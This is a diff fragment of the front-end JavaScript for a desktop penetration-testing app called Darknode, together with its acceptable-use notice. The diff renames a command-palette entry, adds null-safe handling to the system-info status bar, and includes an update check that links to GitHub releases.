         <details class="doc-d"><summary>Acceptable Use Policy</summary><p class="muted">Do not use Darknode against systems you don't own or lack written authorization to test, to develop malware for malicious use, to run denial-of-service attacks, or to violate any law or third-party right. Intended for authorized pentesting, CTFs, research and defense.</p></details>
@@ -4199,7 +4350,7 @@ function palFuzzy(hay, needle) {
 }
 function openPalette() {
   if ($("#pal")) return;
-  const secs = [["home", "Darknode AI (chat)"], ["dash", "Dashboard"], ["audit", "Workstation Audit (CIS Level 1 checks for this machine)"], ["flagship", "Web tools (PROMETHEUS, CITADEL, full darknode.ai catalog)"], ["runner", "Terminal"], ["engagement", "Autonomous engagement (one-click)"], ["recon", "Recon (DNS/WHOIS/headers)"], ["scanner", "Port scanner"], ["fuzzer", "Content fuzzer"], ["tools", "Tools"], ["playbooks", "Playbooks"], ["payloads", "Payloads"], ["exploits", "Exploit databases"], ["lab", "Practice targets (DVWA, Juice Shop...)"], ["vms", "Virtual machines (QEMU/KVM runner)"], ["cloud", "Cloud (AWS / GCP / Azure / K8s)"], ["wordlists", "Wordlists"], ["arsenal", "Arsenal (external tools)"], ["training", "Training (labs, CTF, bug bounty)"], ["http", "HTTP request"], ["cve", "CVE search"], ["encode", "Encode / decode / hash"], ["forensics", "File forensics (hash / entropy / strings / type)"], ["refs", "Reference (regex, status, ports)"], ["loot", "Loot"], ["notes", "Notes"], ["agent", "Agent (autonomous AI)"], ["api", "API (server & endpoints)"], ["settings", "Settings"]];
+  const secs = [["home", "Darknode AI (chat)"], ["dash", "Dashboard"], ["audit", "Workstation Audit (CIS Level 1 checks for this machine)"], ["flagship", "Web tools (CITADEL, PHANTOM, full darknode.ai catalog)"], ["runner", "Terminal"], ["engagement", "Autonomous engagement (one-click)"], ["recon", "Recon (DNS/WHOIS/headers)"], ["scanner", "Port scanner"], ["fuzzer", "Content fuzzer"], ["tools", "Tools"], ["playbooks", "Playbooks"], ["payloads", "Payloads"], ["exploits", "Exploit databases"], ["lab", "Practice targets (DVWA, Juice Shop...)"], ["vms", "Virtual machines (QEMU/KVM runner)"], ["cloud", "Cloud (AWS / GCP / Azure / K8s)"], ["wordlists", "Wordlists"], ["arsenal", "Arsenal (external tools)"], ["training", "Training (labs, CTF, bug bounty)"], ["http", "HTTP request"], ["cve", "CVE search"], ["encode", "Encode / decode / hash"], ["forensics", "File forensics (hash / entropy / strings / type)"], ["refs", "Reference (regex, status, ports)"], ["loot", "Loot"], ["notes", "Notes"], ["agent", "Agent (autonomous AI)"], ["api", "API (server & endpoints)"], ["settings", "Settings"]];
   const items = [...secs.map(([s, n]) => ({ t: "sec", id: s, name: n, desc: "Go to " + n })), ...PLAYBOOKS.map((pb) => ({ t: "pb", id: pb.id, name: "Playbook: " + pb.name, desc: pb.desc })), ...TOOLS.map((tl) => ({ t: "tool", id: tl.id, name: tl.name, desc: tl.cat + " - " + tl.run }))];
   const ov = document.createElement("div"); ov.id = "pal"; ov.className = "pal";
   ov.innerHTML = `<div class="pal-box"><input class="pal-in" id="pal-in" placeholder="Jump to a section or run a tool..." spellcheck="false"><div class="pal-list" id="pal-list"></div></div>`;
@@ -4266,7 +4417,7 @@ document.addEventListener("keydown", (e) => {
 // target persistence + wiring
 (function () { const t = $("#target"); if (t) { try { t.value = localStorage.getItem("s_target") || ""; } catch (_) {} const syncTb = () => { const sb = $("#sb-target"); if (sb) sb.textContent = t.value ? "target: " + t.value : ""; }; t.addEventListener("input", () => { try { localStorage.setItem("s_target", t.value); } catch (_) {} syncTb(); }); syncTb(); } })();
 // status bar: host + version, live clock
-S.sysinfo().then((s) => { const h = $("#sb-hosttxt"); if (h) h.textContent = s.hostname + " · " + s.platform; const v = $("#sb-ver"); if (v) v.textContent = "v" + (s.version || ""); });
+S.sysinfo().then((s) => { s = s || {}; const h = $("#sb-hosttxt"); if (h) h.textContent = [s.hostname, s.platform].filter(Boolean).join(" · ") || "—"; const v = $("#sb-ver"); if (v) v.textContent = s.version ? "v" + s.version : ""; }).catch(() => {});
 (function () { const c = $("#sb-clock"); if (!c) return; const tick = () => { const d = new Date(), p = (n) => String(n).padStart(2, "0"); c.textContent = p(d.getHours()) + ":" + p(d.getMinutes()) + ":" + p(d.getSeconds()); }; tick(); setInterval(tick, 1000); })();
 // in-app update check
 if (S.checkUpdate) S.checkUpdate().then((r) => { if (r && r.ok && r.update) { const sb = $("#sb-ver"); if (sb) { sb.textContent = "v" + r.current + " → v" + r.latest + " available"; sb.classList.add("sb-update"); sb.title = "A newer version is available — open Downloads"; sb.style.cursor = "pointer"; sb.onclick = () => S.openExternal("https://github.com/Darknode-Official/darknode-app/releases/latest"); } _toast && _toast("Update available: v" + r.latest + " — see Downloads", 5000); } }).catch(() => {});
@@ -4295,7 +4446,7 @@ if (S.checkUpdate) S.checkUpdate().then((r) => { if (r && r.ok && r.update) { co
   }); } }
 $("#nav").onclick = (e) => { const b = e.target.closest(".nav-item"); if (b) go(b.dataset.sec); };
 { const cr = $("#crumbs"); if (cr) cr.onclick = (e) => { const b = e.target.closest("[data-crumb]"); if (b) go(b.dataset.crumb); }; }
-S.sysinfo().then((s) => { $("#side-foot").textContent = s.hostname + " · " + s.platform; });
+S.sysinfo().then((s) => { s = s || {}; const f = $("#side-foot"); if (f) f.textContent = [s.hostname, s.platform].filter(Boolean).join(" · ") || "—"; }).catch(() => {});
 
 // ---- save the exact frame (Ctrl+S): section + typed text, restored on next launch ----
 const _toast = (msg, ms) => { const t = document.createElement("div"); t.className = "toast"; t.textContent = msg; document.body.appendChild(t); requestAnimationFrame(() => t.classList.add("in")); setTimeout(() => { t.classList.remove("in"); setTimeout(() => t.remove(), 300); }, ms || 2400); };
